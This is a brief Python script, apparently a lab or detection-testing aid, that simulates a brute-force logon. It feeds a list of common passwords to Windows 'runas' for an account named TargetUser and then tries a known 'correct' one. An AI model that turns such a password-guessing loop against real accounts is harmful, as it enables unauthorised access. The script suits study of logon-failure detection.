import subprocess
import time

target = "TargetUser"
wrong_passwords = [
    "abc123", "password", "letmein", "12345678", "qwerty", 
    "sunshine", "monkey", "dragon", "baseball", "iloveyou",
    "trustno1", "superman", "batman", "master", "hello",
    "shadow", "michael", "jessica", "princess", "charlie",
    "donald", "password1", "qwerty123", "welcome", "login",
    "admin", "passw0rd", "starwars", "football", "whatever"
]
correct_password = "Password123"

#Brute force simulation

#invalid attempts

for password in wrong_passwords:
    subprocess.run(
        ["runas", f"/user:{target}", "cmd"],
        input=f"{password}\n",
        capture_output=True,
        text=True
    )
    time.sleep(0.5)

# Successful attempt

subprocess.run(
    ["runas", f"/user:{target}", "cmd"],
    input=f"{correct_password}\n",
    capture_output=True,
    text=True
)

print("Simulation complete")